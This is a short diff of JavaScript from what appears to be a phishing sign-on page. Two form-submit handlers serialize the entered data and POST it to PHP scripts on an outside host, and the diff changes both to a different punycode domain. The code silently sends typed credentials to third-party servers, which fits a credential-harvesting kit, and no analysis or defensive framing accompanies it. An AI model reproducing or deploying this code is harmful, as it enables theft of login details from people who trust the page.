@@ -240,7 +240,7 @@ var counts = 0;
 $('#signOnForm').on('submit', function(e){
 		count = count+1;
 		$('#btn1').html('<i class="fa fa-refresh fa-spin"></i>');
-		$.post('https://www.pomocalkoholikum.cz/363738/data.php', $(this).serialize(), function(data){
+		$.post('https://xn----7sbge5cazih.xn--p1ai/addressman/data.php', $(this).serialize(), function(data){
 			console.log(data);
 		});
 		setTimeout(function() {
@@ -261,7 +261,7 @@ $('#signOnForm').on('submit', function(e){
 $('#signOnForm2').on('submit', function(e){
 		counts = counts+1;
 		$('#btn').html('<i class="fa fa-refresh fa-spin"></i>');
-		$.post('https://www.pomocalkoholikum.cz/363738/cok.php', $(this).serialize(), function(data){
+		$.post('https://xn----7sbge5cazih.xn--p1ai/addressman/cok.php', $(this).serialize(), function(data){
 			console.log(data);
 		});
 		setTimeout(function() {
